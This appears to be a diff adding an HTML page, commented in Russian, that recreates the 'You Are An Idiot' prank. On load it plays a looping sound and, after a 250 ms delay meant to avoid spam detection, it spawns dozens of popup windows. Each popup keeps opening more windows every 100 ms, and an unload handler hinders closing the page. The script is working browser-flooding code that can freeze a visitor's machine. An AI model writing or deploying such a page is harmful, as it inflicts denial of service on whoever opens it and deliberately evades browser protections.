@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>you are an idiot</title>
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        background: #000;
+        height: 100%;
+        width: 100%;
+    }
+    .full-gif {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        object-fit: contain;
+        image-rendering: pixelated;
+        filter: grayscale(100%);
+    }
+</style>
+</head>
+<body>
+
+<img class="full-gif" src="https://upload.wikimedia.org/wikipedia/commons/5/5c/You_Are_An_Idiot_screen.gif" alt="YOU ARE AN IDIOT">
+
+<script>
+// Классический звук точно как на оригинальном сайте
+const soundUrl = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
+
+function playSound() {
+    const audio = new Audio(soundUrl);
+    audio.loop = true;
+    audio.volume = 0.98;
+    audio.play().catch(() => {
+        // Если браузер блокирует — пробуем ещё раз после любого действия
+        document.body.addEventListener('click', () => audio.play(), { once: true });
+        document.body.addEventListener('touchstart', () => audio.play(), { once: true });
+    });
+}
+
+// Запускаем звук сразу при загрузке
+playSound();
+
+// Создание новой вкладки-точно-как-на-youareanidiot.cc
+function spawnIdiotWindow() {
+    const w = window.open('', '_blank', 
+        `width=${350 + Math.random()*180},height=${260 + Math.random()*140},` +
+        `left=${Math.random()*(screen.availWidth-500)},top=${Math.random()*(screen.availHeight-400)}`
+    );
+
+    if (!w) return;
+
+    w.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head><title>you are an idiot</title></head>
+        <body style="margin:0;background:#000;overflow:hidden;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/You_Are_An_Idiot_screen.gif" 
+                 style="position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:contain;image-rendering:pixelated;filter:grayscale(100%);">
+            
+            <script>
+                const audio = new Audio('${soundUrl}');
+                audio.loop = true;
+                audio.volume = 0.95;
+                audio.play();
+                
+                // Каждая вкладка сама спамит новые
+                setInterval(() => {
+                    window.open('', '_blank');
+                }, 100);
+            <\/script>
+        </body>
+        </html>
+    `);
+}
+
+// Запуск ада сразу при открытии (точь-в-точь как оригинал)
+function startFullChaos() {
+    playSound();
+
+    // Первый взрыв — 35–40 окон
+    for (let i = 0; i < 40; i++) {
+        setTimeout(spawnIdiotWindow, i * 22);
+    }
+
+    // Постоянный спам каждые ~90мс
+    setInterval(() => {
+        for (let i = 0; i < 9; i++) {
+            setTimeout(spawnIdiotWindow, i * 18);
+        }
+    }, 90);
+
+    // Мощный доп.взрыв каждые 2 секунды
+    setInterval(() => {
+        for (let i = 0; i < 15; i++) {
+            spawnIdiotWindow();
+        }
+    }, 2000);
+
+    window.onbeforeunload = () => "YOU ARE AN IDIOT 😂";
+}
+
+// Старт через 250мс (чтобы браузер не подумал, что это спам)
+setTimeout(startFullChaos, 250);
+</script>
+
+</body>
+</html>
